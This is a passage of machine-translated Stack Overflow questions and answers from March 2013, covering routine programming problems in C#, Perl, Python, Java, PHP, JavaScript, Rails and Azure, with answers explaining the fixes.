                string fin = "\nDirect method took " + exectime.Elapsed.TotalSeconds + "s";
                Console.WriteLine(fin);
                file.WriteLine(fin);
                file.Close();
            }
        }
    }
} 
```

字符串方法耗时 2.2985349s 直接方法耗时 0.07191s

这是在具有 5Gb RAM 的 3.5GHz CPU 上。

我很失望，简单地将输出缓冲在一个字符串中是如此昂贵！

在我的真实程序中，我需要推迟输出，直到字符串被组装。有更快的方法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-27T02:02:53.097

是的，使用 a[`StringBuilder`](http://msdn.microsoft.com/en-us/library/system.text.stringbuilder%28v=vs.100%29.aspx)来组装你的字符串。

有关性能提升的深入解释，请参阅[“使用 StringBuilder 类”](http://msdn.microsoft.com/en-us/library/2839d5h5%28v=vs.100%29.aspx) - 但基本上因为字符串是不可变的，所以在连接时会创建一个新字符串，这非常昂贵。

# perl - perl DBI->connect 弹出“没有到主机的路由”虽然我可以选择主机

> ID：15650731
> 
> 赞同：0
> 
> 时间：2013-03-27T02:01:11.103
> 
> 标签：perl, postgresql, dbi, dbd

我有这个 perl 脚本

**包装器.pl**

```
#!/usr/bin/env perl
use strict;
use warnings;
use Getopt::Long;
use DBI;

# input params
my $end;
my $start;
my $url;
my @IP;
my $host = "localhost";
my $dbname = "flows";
my $username;
my $pass;
GetOptions      ("s|start=s" => \$start,
                 "e|end=s" => \$end,
                 "r|url=s" => \$url,
                 "ip|iplist=s" => \@IP,
                 "h|host=s" => \$host,
                 "db|dbname=s" => \$dbname,
                 "u|username=s" => \$username,
                 "p|pass=s" => \$pass);

# connect and send request to database

 my $dbh = DBI->connect("DBI:Pg:dbname=".$dbname.";host=".$host, $username, $pass, {'RaiseError' => 1}); 
```

当我跑步时

```
./wrapper.pl -h 10.0.0.3 
```

我得到：

```
DBI connect('dbname=flows;host=10.0.0.3','',...) failed: could not connect to server: No route to host
Is the server running on host "10.0.0.3" and accepting
TCP/IP connections on port 5432? 
```

我可以 ping 服务器，它也应该接受 5432 上的连接。由于登录凭据错误，我可能会收到此消息吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T09:28:56.467

首先你应该`use DBD::Pg;`在`use DBI;`

其次添加`DBI->errstr`更正确的错误

> 我的 $dbh = DBI->connect("DBI:Pg:dbname=".$dbname.";host=".$host, $username, $pass, {'RaiseError' => 1}) 或死 DBI->错误；

第三，您应该能够在从 DBI 尝试之前从命令行连接到 psql

`psql -h 10.0.0.3 -U username -d dbname -p 5432`（请检查语法）

# ninject - 具有相同数量参数的多个 ctor 的构造函数依赖解析

> ID：15650739
> 
> 赞同：1
> 
> 时间：2013-03-27T02:02:22.937
> 
> 标签：ninject

我有 2 个这样定义的构造函数：

```
public interface IMyService<T1,T2>{}
public class MyService1 : IMyService<SomeTypeA,SomeTypeB>
{
    public MyService2(string serviceAUri,IServiceB svc){}
    public MyService2(IServiceA svc,IServiceB svc){}

}
public class MyService2 : IMyService<SomeTypeC,SomeTypeD>
{
    public MyService2(string serviceAUri,IServiceB svc){}
    public MyService2(IServiceA svc,IServiceB svc){} 
```

~~公共 MyService2(IServiceC svc,IServiceD svc){}~~ }

我在 T1 和 T2 的不同值上注册 IMyService 的多个服务实现，因此注册机制必须在接口的实现中是通用的。

如何在不使用 [Inject] 属性的情况下指定要调用的构造函数？是否有一些我可以在“绑定”中指定的约定来指导 Ninject 选择带有“url”参数的构造函数而不是其他的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-28T15:37:01.800

I recommend not to have multiple constructors. The only situation I can think of where this is relevant is if you are not the owner of the class. E.g. injecting a .NET library class somewhere. In that rare case you can define the constructor using the `ToConstructor` overload:

```
int someConstantValue = 1;
Func<int> someOtherValue = () => Random(10);
Bind<IFoo>.ToConstructor(c => new Foo(c.Inject<IBar>(), someConstantValue, someOtherValue, c.Inject<IBaz>()); 
```

# php - .mp4 和 .wmv 文件在 chrome 中不起作用

> ID：15650740
> 
> 赞同：0
> 
> 时间：2013-03-27T02:02:43.237
> 
> 标签：php, html, video, embed, mp4

我正在使用以下内容在浏览器中显示一个 .mp4 文件：-

```
<![if !IE]> 
    <video width="480" height="360" controls="controls">
        <source src="<?php echo $video; ?>" type="video/mp4">
        <param name="src" value="<?php echo $video; ?>" />
        <param name="autoplay" value="true" />
    </video>
<![endif]>

<!--[if IE]>
    <object width="480" height="360" type="application/x-mplayer2" codebase="http://www.microsoft.com/Windows/MediaPlayer/">
    <param name="Filename" value="<?php echo $video; ?>">
    <param name="AutoStart" value="true">
    <param name="ShowControls" value="true">
    <param name="BufferingTime" value="2">
    <param name="ShowStatusBar" value="true">
    <param name="AutoSize" value="true">
    <param name="InvokeURLs" value="false">
    </object>
<![endif]--> 
```

在 IE 中，它正在显示文件，但在 chrome 中不起作用。但是，如果我使用相同的代码并将 src 更改为已经位于网络上的视频，它可以工作：-

```
<video width="480" height="360" controls="controls">
        <source src="http://ia700204.us.archive.org/2/items/Pbtestfilemp4videotestmp4/video_test_512kb.mp4" type="video/mp4">
        <param name="src" value="http://ia700204.us.archive.org/2/items/Pbtestfilemp4videotestmp4/video_test_512kb.mp4" />
        <param name="autoplay" value="true" />
    </video> 
```

我也尝试过嵌入代码：-

```
<embed src="<?php echo $video; ?>" type="application/x-mplayer2" autostart="1" enabled="1" showstatusbar="1" showdisplay="1" showcontrols="1" pluginspage="http://www.microsoft.com/Windows/MediaPlayer/" CODEBASE="http://activex.microsoft.com/activex/controls/mplayer/en/nsmp2inf.cab#Version=6,0,0,0" width="480" height="360"></embed> 
```

如果是代码问题，那么即使是网上可用的 .mp4 文件也不应该播放。如果是源问题，则该文件不应在 Internet Explorer 中播放。

有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T03:04:23.240

The answer is really easy all you needed to do is this

```
<embed src="http://ia700204.us.archive.org/2/items/Pbtestfilemp4videotestmp4/video_test_512kb.mp4" height="200" width="500" /> 
```

This is just the easiest possible solution and I'm sure there are different ways too.

# python - python 2.7中的三元堆排序

> ID：15650742
> 
> 赞同：2
> 
> 时间：2013-03-27T02:02:48.743
> 
> 标签：python, algorithm, sorting, python-2.7

我正在尝试实现三元堆排序，堆的每个父级都有 3 个子级，但是我无法让我的代码返回排序列表。我想我可能在某处犯了一个逻辑错误但无法发现它，任何修复此代码的帮助将不胜感激。

```
def swap(i, j):
    sqc[i], sqc[j] = sqc[j], sqc[i]

def heapify(end,i):
    l=3 * (i + 1)
    m=3 * (i + 2)
    r=3 * (i + 3)
    max=i
    if l < end and sqc[i] < sqc[l]:
        max = l
    if r < end and sqc[max] < sqc[r]:
        max = r
    if m < end and sqc[max] < sqc[m]:
        max = m
    if max != i:
        swap(i, max)
        heapify(end, max)

def heap_sort():
    end = len(sqc)
    start = end / 2 - 1
    for i in range(start, -1, -1):
        heapify(end, i)
    for i in range(end-1, 0, -1):
        swap(i, 0)
        heapify(i, 0)

sqc = [2, 7, 1, -2, 56, 5, 3]
heap_sort()
print(sqc) 
```

`[7, 1, -2, 56, 5, 2, 3]`是返回的，完全乱序。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T04:25:23.583

# 代码

```
def heapSort3(a):
    def sift(start, count):
        root = start
        while root * 3 + 1 < count:
            r3 = root * 3
            upper = min(count - r3, 4)
            children = list(range(r3 + 1, r3 + upper))
            min_child = min((a[i], i) for i in children)
            v, i = min_child
            if a[root] > a[i]:
                a[root], a[i] = a[i], a[root]
                root = i
            else:
                break
    count = len(a)
    for start in reversed(range(count // 3 + 2)):
        sift(start, count)
    for end in reversed(range(count)):
        a[end], a[0] = a[0], a[end]
        sift(0, end)
    return a 
```

# 测试排序和反向排序

```
for i in range(2, 25):
    print '-' * 30
    data = list(range(i))
    sorted_data = heapSort3(data)
    print i, sorted_data
    data = list(reversed(range(i)))
    sorted_data = heapSort3(data)
    print i, sorted_data 
```

# 对混洗数据进行测试

```
from random import shuffle
for i in range(1, 100):
    print '-' * 30, i
    expected = list(reversed(range(i)))
    for _ in range(5000):
        data = list(range(i))
        shuffle(data)
        sorted_data = heapSort3(data)
        assert sorted_data == expected 
```

# 参考

改编自此[代码](http://www.codecodex.com/wiki/Heapsort#Python)。有点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T14:42:10.820

这是一个仅纠正您的`heapify`功能的解决方案：

```
def swap(series, i, j):
    series[i], series[j] = series[j], series[i]

def heapify(series, end, i):
    firstchild = 3*i + 1
    lastchild = min(firstchild + 3, end)
    children = list(range(firstchild, lastchild))
    maxelem = max((series[j], j) for j in [i] + children)
    maxval, maxindex = maxelem
    if maxindex != i:
        swap(series, i, maxindex)
        heapify(series, end, maxindex)

def heap_sort(series):
    end = len(series)
    start = end / 2 - 1
    for i in range(start, -1, -1):
        heapify(series, end, i)
    for i in range(end-1, 0, -1):
        swap(series, i, 0)
        heapify(series, i, 0)
    return series 
```

# 堆排序变化

您也可以将`heapsort`代码更改为此，但这不是必需的：

```
def heap_sort(series):
    end = len(series)
    start = end // 2
    for i in reversed(range(start)):
        heapify(series, end, i)
    for i in reversed(range(end)):
        swap(series, i, 0)
        heapify(series, i, 0)
    return series 
```

# 测试您的数据

```
>>> sqc = [2, 7, 1, -2, 56, 5, 3]
>>> print heap_sort(sqc)
[-2, 1, 2, 3, 5, 7, 56] 
```

# 测试随机打乱的数据

```
from random import shuffle
for i in range(1, 100):
    print '-' * 30, i
    expected = list(range(i))
    for _ in range(5000):
        data = list(range(i))
        shuffle(data)
        sorted_data = heap_sort(data)
        assert sorted_data == expected 
```

# java - 你如何将信息存储在spring mvc的会话内存中以便以后获取？

> ID：15650746
> 
> 赞同：0
> 
> 时间：2013-03-27T02:03:10.287
> 
> 标签：java, spring, spring-mvc

我有一个独特的情况，我想通过 POST 将整数数组存储到内存中。我想稍后用 GET 请求获取这些数据。

这可能看起来很奇怪，也很奇怪，但我确实有一个用例，它只会在内存中停留几秒钟。

一个简单的例子——存储数组 someArray = [1, 2, 3]; 在某种带有 POST 的内存存储中，并通过 GET 在另一个函数中检索它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:09:59.890

由于您将可以访问`HttpServletRequest`控制器，因此您只需调用[`getSession`](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getSession(boolean))方法：

```
HttpSession session = request.getSession(false); 
```

现在您可以访问 Session，因此您可以使用相关方法从其中存储、检索和删除数据：

*   [`HttpSession#setAttribute`](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpSession.html#setAttribute(java.lang.String,%20java.lang.Object))
*   [`HttpSession#getAttribute`](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpSession.html#getAttribute(java.lang.String))
*   [`HttpSession#removeAttribute`](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpSession.html#removeAttribute(java.lang.String))

* * *

正如评论中所说，您还可以省略手动获取会话并将其作为参数从您的`@Controller`. 取自[这个答案](https://stackoverflow.com/a/8682679/1065197)

```
@RequestMapping...)
public String processSubmit(..., HttpSession session, ...) {
    Object anAttribute = session.getAttribute("anAttribute");
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-27T02:09:25.117

我曾经有过这样的需求，首先将主要数据发布到控制器，然后将一些详细数据发布到控制器，然后将两种数据结合起来，并从数据库中检索数据与这些数据。我只是将主要数据存储在 session 中`session.setAttribute()`，Spring mvc 有一个`@SessionAttribute`，但是尝试了数十次后，我放弃了，使用起来非常困难。

# asp.net-mvc-4 - 在 Azure 中与 MVC 项目一起运行 WebApi

> ID：15650748
> 
> 赞同：1
> 
> 时间：2013-03-27T02:03:26.440
> 
> 标签：asp.net-mvc-4, azure, asp.net-web-api

我有一个 MVC 项目和一个单独的 Web Api 项目的解决方案。我一直在研究 MVC 部分，并将其作为 Web 角色托管在云服务项目中。

现在我需要在 Web Api 上构建。在 azure 模拟器中按原样运行解决方案我无法访问我的 Web Api 控制器，我得到一个 404 Not Found。

在解决方案中创建 WebApi 项目后，我需要采取哪些步骤才能使我的 MVC 项目与它一起使用 jQuery ajax 调用（来自 MVC 项目）访问 Api 控制器？

注意：将使用 Api 的应用程序部分位于子域中（例如“使用应用程序.myapplication.com/api/Values”。我不知道这是否有任何区别。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T07:57:41.933

好的，以下是在 Azure 中以单个 Web 角色并行运行 MVC 和 WebApi 的步骤：

1.  仅将 MVC 项目添加为云服务项目中的 Web 角色。
2.  打开 ServiceDefinition.csdef 配置如下：

    ```
    <Sites>
       <Site name="Web" physicalDirectory="..\..\..\Application.Web">
          <Bindings>
             <Binding name="Endpoint1" endpointName="Endpoint1" />
          </Bindings>
       </Site>
       <Site name="Web.Api" physicalDirectory="..\..\..\Application.Web.Api">
          <Bindings>
             <Binding name="Endpoint1" endpointName="Endpoint1" hostHeader="api.myapplication.com"/>
          </Bindings>
       </Site>      
    </Sites> 
    ```

    **注意：** 物理目录与部署到 CloudProject\bin\release 的定义文件相关，因此您需要回溯 3 个节点才能到达解决方案文件夹。此外，我在尝试运行项目时遇到了一些麻烦，它会自动将物理目录切换回错误的路径。为了解决这个问题，我右键单击云项目 >**项目依赖项**> 确保两个项目都被选中。还要确保保存并关闭定义文件的文本编辑器的所有实例，然后重新构建，最后运行。似乎是某种让我发疯并最终消失的错误。

3.  配置您的主机文件以允许使用模拟器进行本地测试：

    127.0.0.1 myapplication.com api.myapplication.com

4.  要使用[此 .NET cors 实现](http://brockallen.com/2012/06/28/cors-support-in-webapi-mvc-and-iis-with-thinktecture-identitymodel/)，请在您的 WebApi 项目上运行以下 Nuget 命令：

    安装包 Thinktecture.IdentityModel

5.  将以下类（取自帖子）添加到您的 WebApi 项目中：

    ```
    public static class CorsConfig
    {
        public static void RegisterCors(HttpConfiguration httpConfiguration)
        {
            WebApiCorsConfiguration corsConfig = new WebApiCorsConfiguration();
            corsConfig.RegisterGlobal(httpConfiguration);

            corsConfig
                .ForResources("Values") //Controller nae
                .ForOrigins("http://myapplication.com", "myapplication.com:81")
                .AllowAll();
        }
    } 
    ```

6.  来自`RegisterCors()`_`Application_Start()`

7.  确保 WebApi 项目中的 Web.config 具有`OPTIONS`以下动词`ExtensionlessUrlHandler`：

    ```
     <add name="ExtensionlessUrlHandler-Integrated-4.0" path="*." verb="GET,HEAD,POST,DEBUG,PUT,DELETE,PATCH,OPTIONS" type="System.Web.Handlers.TransferRequestHandler" preCondition="integratedMode,runtimeVersionv4.0" /> 
    ```

8.  发出跨域请求以访问您的 api 控制器：

    ```
    $.ajax({ url: "http://api.myapplication.com/api/Values", ... }) 
    ```

还有维奥拉！

希望对其他人有所帮助

# java - 有没有办法从超类型调用未实现的抽象方法？

> ID：15650749
> 
> 赞同：0
> 
> 时间：2013-03-27T02:03:37.087
> 
> 标签：java, runnable

我正在使用一个 java 库，它需要从 AWT 事件调度线程中使用某些对象。我想为使用这个库的程序创建一个接口。到目前为止，我有这个。

```
public abstract class IProgram implements Runnable {
    public static void main(String[] args) {

    }
    public void run() {
        start();
    }
    public abstract void start();
} 
```

在主要方法中，我想运行任何子类。例如，如果这是程序：

```
public class MyProgram implements IProgram {
    public void start() {
        //Code to run program here...
    }
} 
```

然后我想运行 MyProgram 并让它作为可运行文件运行。这可能吗？如果是，我会放入 IProgram 的主要方法吗？

编辑：通常调用一个可运行我使用 SwingUtilities.invokeLater(new RunnableImplementation());

# php - 为什么引用使用更多内存？

> ID：15650753
> 
> 赞同：3
> 
> 时间：2013-03-27T02:04:01.287
> 
> 标签：php, memory, reference

他们不应该让脚本使用更少的内存吗？

`function a(&$var);`使用更多的内存比`function a($var);`

并`foreach($array as $k => &$v)`使用更多的内存比`foreach($array as $k => $v)`

例如`$var`使用 24 MB。如果我通过引用传递它，它使用 27 MB

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:22:23.260

（不幸的是）无法详细解释zend引擎内部的*魔力，我指的是*[文档](http://www.php.net/manual/en/language.references.whatare.php)：

> PHP 中的引用是一种通过不同名称访问相同变量内容的方法。它们不像 C 指针；例如，您不能使用它们执行指针运算，它们不是实际的内存地址，等等。有关更多信息，请参阅什么不是参考。相反，它们是符号表别名。注意在PHP中，变量名和变量内容是不同的，所以同样的内容可以有不同的名字。最接近的类比是 Unix 文件名和文件 - 变量名是目录条目，而变量内容是文件本身。引用可以比作​​ Unix 文件系统中的硬链接。

我认为与 unix 文件系统的比较很容易理解。如果一个文件有多个名称，则需要额外的内存来存储这些名称。

# java - .Jar 文件兼容性

> ID：15650754
> 
> 赞同：0
> 
> 时间：2013-03-27T02:04:04.513
> 
> 标签：java, windows, macos, jar

如果我在 mac 上将 java 源文件编译成 .jar 文件，相同的 .jar 程序会在 windows 机器上运行吗？感谢您的帮助，如果这是一个菜鸟问题，对不起。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:05:51.427

是的，这就是 Write Once Run Anywhere 的重点 :-)

一个小问题：您将 Java 源代码编译为字节码（类文件）。JAR 文件只是打包字节码（并做一些其他漂亮的事情，如数字签名、压缩等）

# javascript - 我应该如何表示数据以进行有效的搜索和比较字符串

> ID：15650755
> 
> 赞同：0
> 
> 时间：2013-03-27T02:04:11.617
> 
> 标签：javascript, performance, data-structures

我有两个长度为 300 的数组。它们看起来像这样（JSON 表示）：

```
[
    [
        ["word1",0.000199],
        ["word2",0.000102],
          ...
        ["word15",0.000102]
    ],
      ...
    [
        ["anotherword1",0.0032199],
        ["anotherword2",0.032302],
          ...
        ["anotherword15",0.0320102]
    ]
] 
```

我有这个蛮力算法：

```
for(var i = 0; i < 300; i++)
    {
        for(var j = 0; j < 15; j++)
        {
            for(var ii = i + 1; ii < 300; ii++)
            {
                for(var jj = 0; jj < 15; jj++)
                {
                    for(var jjj = 0; jjj < 15; jjj++)
                    {
                        if(new_keywords[i][j][0] === new_keywords[ii][jj][0] && new_keywords[ii][jj][0] === state_keywords[i][jjj][0])
                        {
                            console.log(0);
                        }
                    }
                }
            }
        }
} 
```

我需要在这些数组中搜索相同的单词，如果单词相同，那么我将值相加并将 sum 除以 3 并在 state_keywords 数组中替换该值。因此，对于数组中不止一次的每个单词，我都有其值的含义。

现在......我的方法非常糟糕，因为我现在有大约 3 亿次迭代，这太疯狂了。我需要在 JavaScript 中更好地实现我的数组。像字典树或 kd-tree 之类的东西。

谢谢你。

**编辑：**

这是[http://jsfiddle.net/dD7yB/1/](http://jsfiddle.net/dD7yB/1/)示例。

**编辑2：**

如果我不够清楚，我很抱歉。那么我正在做什么：

*   我有数组`state_keywords`。索引从 0 到 299，它们代表`themes`...
*   每个主题可能由 15 个单词表示，并且每次`new_keywords`数组到达时，它们可能会有所不同。
*   当 new_keywords 数组到达时，我需要检查该数组中的每个单词是否`state_keywords`在同一主题索引的数组中。
*   如果是：将概率相加并除以 2。
*   如果不是：将新词添加到 state_keyword 数组中，但如果一个主题的词数超过 15 个（现在是），我只需要存储按概率排序的前 15 个词。

我需要尽可能有效地做到这一点，因为我需要每秒都这样做，所以它必须很快。

**编辑3：**

现在我使用这段代码：

```
var i, j, jj, l;
for(i = 0; i < 300; i++)
{
    for(j = 0; j < 15; j++)
    {
        l = new_keywords[i].length;
        for(jj = 0; jj < l; jj++)
        {
            if(state_keywords[i][j][0] === new_keywords[i][jj][0])
            {  
                state_keywords[i][j][1] = (state_keywords[i][j][1] + new_keywords[i][jj][1]) / 2;
            }
        }
    }
} 
```

这比前一个要快得多。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T02:28:13.747

你为什么不把这些数组变成对象，用字符串作为值的键呢？那么您可以直接查找单词并获取值吗？

```
var wordlists = [
    {
        "word1":0.000199,
        "word2":0.000102,
          ...
        "word15":0.000102
    },
      ...
    {
        "anotherword1":0.0032199,
        "anotherword2":0.032302,
          ...
        "anotherword15":0.0320102
    }
] 
```

然后查找

```
wordlists[0]["word2"]  //0.000102 
```

# php - 动态 PHP URL Ajax 加载 URL

> ID：15650759
> 
> 赞同：0
> 
> 时间：2013-03-27T02:04:35.797
> 
> 标签：php, javascript, jquery, ajax

问题即时在 PHP 中检索变量并希望将其提供给 ajax 以生成 mysql 更新。

```
$.ajax({
url: '../mysqlusercount.php?f=ll&users='<?php echo $_SESSION['user'] ?>,
dataType: 'json',
success: function(data){
 },
}); 
```

这个版本不好用，有大神帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:08:22.543

您正在 JavaScript 字符串之外打印会话变量。尝试这个：

```
url: "../mysqlusercount.php?f=ll&users=<?php echo $_SESSION['user']; ?>" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:07:07.620

不正确的行

```
url: '../mysqlusercount.php?f=ll&users='<?php echo $_SESSION['user'] ?>, 
```

应该

```
url: "../mysqlusercount.php?f=ll&users=<?php echo $_SESSION['user'] ?>", 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T02:13:28.247

注意 HTTP 响应以进行调试。FireBug（firefox或最新版Firefox的插件），Chrome。或者使用 ini_set('display_errors', '1'); 获取错误消息 ...

# terminal - 找不到“subl”命令

> ID：15650761
> 
> 赞同：1
> 
> 时间：2013-03-27T02:05:05.343
> 
> 标签：terminal, sublimetext2

当我尝试`~/.gemrc`在终端中编辑文件时，例如，我收到此错误：

```
$ subl ~/.gemrc
-bash: subl: command not found 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-23T18:00:25.167

按照[此处](http://www.sublimetext.com/docs/2/osx_command_line.html)的说明进行操作。

如果这不起作用并且您正在使用 RVM，请运行：`ln -s "/Applications/Sublime Text 2.app/Contents/SharedSupport/bin/subl" ~/.rvm/bin/subl`

请注意，在这两个命令中，都假定 Sublime Text 2 安装在您的 Applications 目录中。如果它安装在其他地方相应地更改您的命令。

然后，输入`export EDITOR='subl -w'`以启用使用`subl`命令进行编辑。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T02:07:52.690

你安装了“ [Sublime Text 2](http://www.sublimetext.com) ”吗？它是一个文本编辑器，是`subl`命令将启动的内容。

由于您没有 Sublime，您可以使用[`vim`](http://www.vim.org/about.php)安装在 Mac OS 上的 ，它是一个非常强大的文本编辑器，但它确实有一个学习曲线。

还有[`nano`](http://www.nano-editor.org)，这将用于简单的文本编辑目的 尝试`man nano`在命令行输入以获取更多信息。尝试输入`nano ~/.gemrc`以创建有问题的文件。

听起来您对您的计算机或其操作系统并不十分熟悉。试图在不理解的情况下学习编程会让你处于不利地位，因为像 Ruby、Python 和 Perl 这样的语言往往被用于许多操作系统级别的代码以及网络和通信，这是一个“学习堆” .

我建议花一些时间了解命令行的基本命令，熟悉 vim 或下载 Sublime 并尝试一下。（而且，如果您经常使用 Sublime 或 vim，请通过购买副本来鼓励作者——他们是非常好的编辑器，我们希望保留这些工具。）

# python - 值在函数中正确打印，但返回时为 None

> ID：15650762
> 
> 赞同：2
> 
> 时间：2013-03-27T02:05:11.120
> 
> 标签：python, list, function, recursion, return

我只是想复习一下我的python，所以我确定我在这里犯了一个基本错误。我的代码只是一个玩具应用程序，它在循环排序的数组中找到最大的项目。

这是我的代码：

```
def listIsSorted(l):
    if l[0] < l[-1]:
        return 1
    return 0

def findLargest(l):
    listLength = len(l)
    if(listLength == 1):
        return l[0]
    if(listLength == 2):
        if(l[0] > l[1]):
            print("OMG I Found it: " + str(l[0]))
            return l[0]
        return l[1]

    halfway = int(listLength/2)
    firsthalf = l[:int(halfway)]
    secondhalf = l[int(halfway):]
    if(listIsSorted(firsthalf) and listIsSorted(secondhalf)):
        return max(l[halfway - 1], l[-1])
    elif (listIsSorted(firsthalf)):
        findLargest(secondhalf)
    else:
        findLargest(firsthalf)

l4 = [5,1,2,3]
print(findLargest(l4)) 
```

这将输出以下内容：

```
OMG I Found it: 5
None 
```

`None`我的问题是：当它刚刚打印为 5 时，为什么它被返回为 type ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T02:07:54.827

我想它必须以这种方式修改，因为您忘记返回递归调用的结果：

```
def findLargest(l):
    listLength = len(l)
    if listLength == 1:
        return l[0]
    if listLength == 2:
        if l[0] > l[1]:
            print "OMG I Found it: {0}".format(l[0])
            return l[0]
        return l[1]

    halfway = int(listLength/2)
    firsthalf = l[:int(halfway)]
    secondhalf = l[int(halfway):]
    if listIsSorted(firsthalf) and listIsSorted(secondhalf):
        return max(l[halfway - 1], l[-1])
    elif listIsSorted(firsthalf):
        return findLargest(secondhalf)
    else:
        return findLargest(firsthalf) 
```

# maven - Maven 设置 java.library.path

> ID：15650763
> 
> 赞同：2
> 
> 时间：2013-03-27T02:05:12.750
> 
> 标签：maven, java.library.path

我尝试了其他 stackoverflow 问题中提出的其他答案，但其中一些已经过时或不起作用。我想知道让 Maven 设置 java.library.path 的首选方法是什么？

# java - LibGDX 中的奇怪碰撞

> ID：15650770
> 
> 赞同：1
> 
> 时间：2013-03-27T02:06:24.520
> 
> 标签：java, android, libgdx, collision

我试图在一个块上创建一个简单的球反射。我正在使用 libgdx 框架。

我遇到块碰撞问题：

```
public class World {

public Ball ball;
public Bar bar;
public Block block;
public BoundingBox boundsBlock,boundsBall;

public World(){
    initialize();
}

public void initialize(){
    ball = new Ball(10 / 2, 6);
    bar = new Bar(4,1);
    block = new Block(4,7);
    boundsBlock = new BoundingBox(new Vector3(block.position.x,block.position.y,0),new Vector3(block.position.x+2,block.position.y+1,0));
    boundsBall = new BoundingBox(new Vector3(ball.position.x,ball.position.y,0),new Vector3(ball.position.x+1,ball.position.y+1,0));
}

public void update(float delta){
    ball.position.add(ball.direction.x*delta,ball.direction.y * delta,0);

    //Right Collision
    if(ball.position.x + 0.25f >9.65f){
        ball.position.x = 9.65f - 0.25f;
        ball.direction.x = -ball.VELOCITY;
    }

    //Top Collision
    if (ball.position.y + 0.25f > 14.65f){
        ball.position.y = 14.65f - 0.25f;
        ball.direction.y = -ball.VELOCITY;
    }

    //Left Collision
    if(ball.position.x - 0.25f < 0.35f){
        ball.position.x = 0.35f + 0.25f;
        ball.direction.x = ball.VELOCITY;
    }

    //Bar collision
    if(ball.position.y < 1+0.1f){
        if(ball.position.x > bar.position.x && ball.position.x < bar.position.x + 2){
            ball.position.y = 1+ 0.25f;
            ball.direction.y = ball.VELOCITY;
        }

    }

    //Block Collision
    if(boundsBlock.contains(boundsBall)){

        ball.direction.x = -ball.VELOCITY;
        ball.direction.y = -ball.VELOCITY;

    } 
```

问题始于块碰撞。似乎它一直在碰撞区域“内部”，并且它一直将我的球方向改变为负方向，而不是仅在球边界“进入”块边界时执行它。

欢迎所有建议！

非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T02:59:39.633

问题是你在初始化它之后永远不会更新`boundsBall`，所以它总是认为它嵌入在`boundsBlock`.

# javascript - 谷歌翻译翻译页面后运行功能？

> ID：15650774
> 
> 赞同：0
> 
> 时间：2013-03-27T02:06:47.083
> 
> 标签：javascript, jquery, jquery-isotope

我在我的网站上使用谷歌翻译下拉菜单，想知道是否有人知道在翻译发生*后如何调用函数。*

我需要调整页面上某些元素的高度以补偿更长/更短的文本。

任何想法将不胜感激。

# ruby-on-rails - 将 GET（而不是 DELETE）请求链接到错误的控制器

> ID：15650777
> 
> 赞同：1
> 
> 时间：2013-03-27T02:06:55.563
> 
> 标签：ruby-on-rails

我在views/questions/show.html.erb 中有一个链接，可以让用户删除标签。

```
 <%=link_to "x",
:remote => true,
:url => remove_question_tag_path(@question, tag),
:method => :delete,
:html => { :id => "delete-#{tag.name.parameterize}"} %>

<% end %> 
```

remove_question_tag_path 路由是通过将标签资源嵌套在问题资源中来创建的。

```
 resources :questions do 
    resources :answers do 
      member { post :vote }
      end
      resources :tags do
          member do 
            delete :remove
          end 
      end
  end 
```

Rake routes 显示该路由存在，因为我尝试在 url 中使用它

```
remove_question_tag DELETE /questions/:question_id/tags/:id/remove(.:format)               tags#remove 
```

但是，当我单击链接时，它会向 Questions 控制器的 show 操作发出 get 请求，而不是 Tags 控制器的 remove 操作，因为 rake routes 指示是路由的目的地。

```
Started GET "/questions/25?html%5Bid%5D=delete-outdoors&method=delete&url=%2Fquestions%2F25%2Ftags%2F2%2Fremove" for 127.0.0.1 at 2013-03-26 19:01:00 -0700 
```

你能解释一下我可能做错了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T09:14:15.590

尝试这个：

```
<%= link_to "x", remove_question_tag_path(@question, tag), :remote => true, :method => :delete, :html => { :id => "delete-#{tag.name.parameterize}"} %> 
```

说明：您没有为链接指定 url，因此`link_to`对所有给定参数进行哈希`"x"`处理，并将它们视为 url 选项。因此，`:method`选项只是添加到`GET`参数而不是生成`DELETE`请求。

# c# - 为什么代码不会死锁

> ID：15650778
> 
> 赞同：1
> 
> 时间：2013-03-27T02:07:04.710
> 
> 标签：c#, wpf, mvvm, locking, task-parallel-library

有人可以向我解释为什么这段代码不会导致死锁吗？

```
static Object listlock = new Object();

void StartAsync()
{
    System.Threading.Tasks.Task.Factory.StartNew(() => 
        {
            lock(listlock)
                base.OnPropertyChanged("MyList");
        });
}

 public ObservableCollection<MyObjects> MyList
 {
    get
    {
         lock(listlock)
             return  new ObservableCollection<MyObjects>(_myObjectList);
    }
 } 
```

一些背景细节：
该程序使用**MVVM**模式并且**MyList**绑定到**WPF UI**上的**Datagrid**。**_myObjects**只是一个随机的对象列表。 是因为**OnPropertyChange**只是通知 UI 它必须从 MyList 获取新数据并且只是返回而不关心 UI 是否实际获取数据？我知道 OnPropertyChanged 是在单独的线程上调用的，但 UI 存在于单个线程上（不是吗），因此获得通知的线程也是获取数据的线程。我会认为锁不会因此而无法释放？

